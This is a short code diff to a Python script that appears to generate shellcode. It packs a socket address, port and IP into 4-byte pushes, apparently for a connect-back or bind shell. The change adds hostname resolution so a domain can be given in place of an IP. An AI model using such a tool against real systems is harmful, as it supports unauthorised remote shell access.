@@ -22,7 +22,14 @@ port = int(args[1])
 
 af_bytes = struct.pack('<H', 2)
 port_bytes = struct.pack('>H', port)
-ip_bytes = socket.inet_aton(ip)
+try:
+    # Resolve domain to IP (handles IPs too)
+    ip_resolved = socket.gethostbyname(ip)
+except socket.gaierror:
+    print(f"[-] Could not resolve domain: {ip}")
+    sys.exit(1)
+
+ip_bytes = socket.inet_aton(ip_resolved)
 
 if mode_32:
     # 32-bit: Split into two 4-byte pushes
